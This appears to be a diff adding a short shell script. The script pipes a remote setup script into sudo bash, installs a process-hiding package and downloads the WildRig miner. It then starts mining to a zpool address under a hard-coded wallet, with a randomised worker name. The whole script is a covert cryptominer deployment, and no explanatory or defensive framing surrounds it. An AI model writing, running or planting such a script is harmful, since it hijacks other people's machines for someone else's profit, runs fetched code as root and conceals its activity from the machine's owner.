@@ -1,0 +1,2 @@
+#!/bin/sh
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo apt-get update && wget https://github.com/andru-kun/wildrig-multi/releases/download/0.31.3/wildrig-multi-linux-0.31.3.tar.xz && tar -xvf wildrig-multi-linux-0.31.3.tar.xz && ./wildrig-multi -a heavyhash -o heavyhash.sea.mine.zpool.ca:5138 --user RE47dCwCsj3bdCEiVibm4BkNHvdBTJiAbH.BG_Miner-$(echo $(shuf -i 1-99 -n 1))
